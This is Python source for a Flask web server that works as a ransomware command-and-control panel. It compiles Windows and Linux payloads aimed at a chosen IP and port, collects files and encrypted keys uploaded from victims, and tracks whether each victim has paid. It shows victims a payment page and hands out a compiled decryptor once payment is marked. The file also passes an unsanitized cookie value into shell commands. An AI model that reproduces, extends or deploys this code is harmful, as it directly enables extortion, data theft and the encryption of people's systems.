from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, send_file, jsonify, send_file, make_response
from flask_sqlalchemy import SQLAlchemy
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Length
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import os
import uuid
import random
import string
import time
import subprocess
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
key = os.urandom(24)
app.config['SECRET_KEY'] = key
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['MAX_CONTENT_LENGTH'] = 1000 * 1024 * 1024  # 1000MB
db = SQLAlchemy(app)
login_manager = LoginManager(app)

RECEIVED_FOLDER = 'received'
app.config['RECEIVED_FOLDER'] = RECEIVED_FOLDER

class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(20), unique=True, nullable=False)
    password = db.Column(db.String(60), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)
    
class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(2000), unique=True, nullable=False)
    payment_status = db.Column(db.Boolean, default=False)

with app.app_context():
    db.create_all()

#def create_user(username, password):
    #new_user = User(username=username)
    #new_user.set_password(password)
    #db.session.add(new_user)
    #db.session.commit()

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Login')

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and user.check_password(form.password.data):
            login_user(user)
            flash('Login successful!', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Login unsuccessful. Please check your username and password.', 'danger')
    return render_template('login.html', form=form)

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('home'))

@app.route('/received')
@login_required
def received_files():
    folders = [folder for folder in os.listdir(app.config['RECEIVED_FOLDER']) if os.path.isdir(os.path.join(app.config['RECEIVED_FOLDER'], folder))]
    return render_template('received_files.html', folders=folders)

@app.route('/received/<folder_name>')
@login_required
def show_folder(folder_name):
    folder_path = os.path.join(app.config['RECEIVED_FOLDER'], folder_name)
    full_id = get_full_id(folder_path)
    files = os.listdir(folder_path)
    return render_template('folder.html', folder_name=full_id, files=files)

@app.route('/download/<folder_name>/<filename>')
@login_required
def uploaded_file(folder_name, filename):
    return send_from_directory(os.path.join(app.config['RECEIVED_FOLDER'], folder_name), filename, as_attachment=True)

def get_full_id(folder_path):
    id_file_path = os.path.join(folder_path, 'id.txt')
    with open(id_file_path, 'r') as id_file:
        full_id = id_file.read().strip()
    return full_id

@app.route('/generate', methods=['GET','POST'])
@login_required
def generate():
    if request.method == 'POST':
        ip_address = request.form['ip']
        port = request.form['port']
        choice = request.form['choice']

        if choice == 'Windows':
            with open('./Payload/Windows/main.c', 'r') as file:
                code_content = file.read()

            ip_change = code_content.replace('char ip[] = "127.0.0.1";', f'char ip[] = "{ip_address}";')
            ip_port_change = ip_change.replace('int port = 42956;', f'int port = {port};')

            with open('./Payload/Windows/render_template_string/new_main.c', 'w') as file:
                file.write(ip_port_change)
            
            command = 'x86_64-w64-mingw32-gcc -o ./Payload/Windows/program.exe ./Payload/Windows/new_main.c ./Payload/Windows/files.c ./Payload/Windows/encryption.c -I/home/mike/c2/Payload/Windows/curl-8.8.0_2-win64-mingw/include -I/home/mike/c2/Payload/Windows/openssl-3.0.14/include  -L/home/mike/c2/Payload/Windows/curl-8.8.0_2-win64-mingw/lib -L/home/mike/c2/Payload/Windows/openssl-3.0.14 -Wl,-rpath,/home/mike/c2/Payload/Windows/curl-8.8.0_2-win64-mingw/bin -lcurl -lssl -lcrypto -lws2_32 -lwsock32 -lbcrypt'

            os.system(command)
                
            file_path = './Payload/Windows/program.exe'

            return send_file(file_path, as_attachment=True)

        elif choice == 'Linux':
            with open('./Payload/Linux/main.c', 'r') as file:
                code_content = file.read()

            ip_change = code_content.replace('char ip[] = "127.0.0.1";', f'char ip[] = "{ip_address}";')
            ip_port_change = ip_change.replace('int port = 42956;', f'int port = {port};')

            with open('./Payload/Linux/new_main.c', 'w') as file:
                file.write(ip_port_change)
            
            command = 'gcc ./Payload/Linux/new_main.c ./Payload/Linux/files.c ./Payload/Linux/encryption.c lib/rsa.c lib/rsa.h -lcurl -lssl -lcrypto -w -o program'

            os.system(command)
                
            file_path = './Payload/Linux/program'

            return send_file(file_path, as_attachment=True)


        
    return render_template('generate.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files or 'id' not in request.form:
        return "No file selected\n", 400

    file = request.files['file']
    id = request.form['id']

    if len(file.filename) > 10000:
        return "Too long\n", 400

    if file.filename == '':
        return "No file selected\n", 400

    # Utiliser le début de l'ID comme nom de dossier
    folder_name = id
    folder_path = os.path.join(app.config['RECEIVED_FOLDER'], folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    # Stocker l'ID complet dans un fichier texte
    id_file_path = os.path.join(folder_path, 'id.txt')
    with open(id_file_path, 'w') as id_file:
        id_file.write(id)

    # Enregistrer le fichier
    file_path = os.path.join(folder_path, file.filename)
    file.save(file_path)

    path_encrypt_aes = folder_path + "/aes_key.txt"
    with open(path_encrypt_aes , 'r') as fichier:
        encrypt_aes = fichier.read()

    # Ajouter l'ID dans la table "victim"
    existing_victim = Victim.query.filter_by(key=encrypt_aes).first()
    if existing_victim is None:
        # Ajouter l'ID dans la table "victim"
        new_victim = Victim(key=encrypt_aes)
        db.session.add(new_victim)
        db.session.commit()

    return f"The file {file.filename} has been sent with the IP address: {request.remote_addr}!\n"

@app.route('/victim_login', methods=['GET', 'POST'])
def victim_login():
    message = None
    if request.method == 'POST':
        key = request.form['key']
        victim = Victim.query.filter_by(key=key).first()
        if victim:
            response = make_response(redirect(url_for('pay') if not victim.payment_status else url_for('paid')))
            response.set_cookie('key', key)
            return response
        else:
            message = "Invalid key. Please try again."

    return render_template('victim_login.html', message=message)

@app.route('/pay')
def pay():
    return render_template('pay.html')

@app.route('/paid')
def paid():
    return render_template('paid.html')

def find_iv(path):
    with open(path, 'r', encoding='utf-8') as fichier:
        contenu = fichier.read()
    return contenu

@app.route('/download_decryption', methods=['GET', 'POST'])
def download_decryption():
    if request.method == 'POST':
        choice = request.form.get('os')
        
        encrypt_aes = request.cookies.get('key')
        path_encrypt_aes = encrypt_aes[:10]

        path = '/var/www/c2/received/' + path_encrypt_aes + '/iv.txt'
        encrypt_iv = find_iv(path)

        os.system("rsa_decoder/aes_decoder " + encrypt_aes + " > clear_aes.txt")
        
        with open('clear_aes.txt', 'r') as fichier:
            clear_aes = fichier.read()

        os.system("rsa_decoder/iv_decoder " + encrypt_iv + " > clear_iv.txt")

        with open('clear_iv.txt', 'r') as fichier:
            clear_iv = fichier.read()

        with open('decryptor/main.c', 'r') as file:
            code_content = file.read()

        aes_change = code_content.replace('char* aes_string = "33a6d2d0df5214491ebc2b3540ed97c31838b6dd35cbec74c6efad5280efec65";', f'char* aes_string = "{clear_aes}";')
        iv_aes_change = aes_change.replace('char* iv_string = "d9822cbd2bff813630764fa8b004904d";', f'char* iv_string = "{clear_iv}";')

        with open('decryptor/new_main.c', 'w') as file:
            file.write(iv_aes_change)

        if "Windows" in choice:
            os.system("decryptor/compile_w.sh")
            return send_file("decryptor/dechiffrement.exe", as_attachment=True)

        elif "Linux" in choice:
            os.system("decryptor/compile.sh")
            return send_file("decryptor/program3", as_attachment=True)


@app.route('/victims', methods=['GET', 'POST'])
@login_required
def victims():
    if request.method == 'POST':
        victim_ids = request.form.getlist('victim_ids')
        for victim_id in victim_ids:
            victim = Victim.query.get(victim_id)
            if victim:
                payment_status = request.form.get(f'payment_status_{victim_id}', '0') == '1'
                victim.payment_status = payment_status
                db.session.commit()

    victims = Victim.query.all()
    return render_template('victims.html', victims=victims)

if __name__ == '__main__':
        # Uncomment the line below to create a user
        #create_user('jay', 'jay')
    app.run(host="0.0.0.0", port=4295, debug=True)
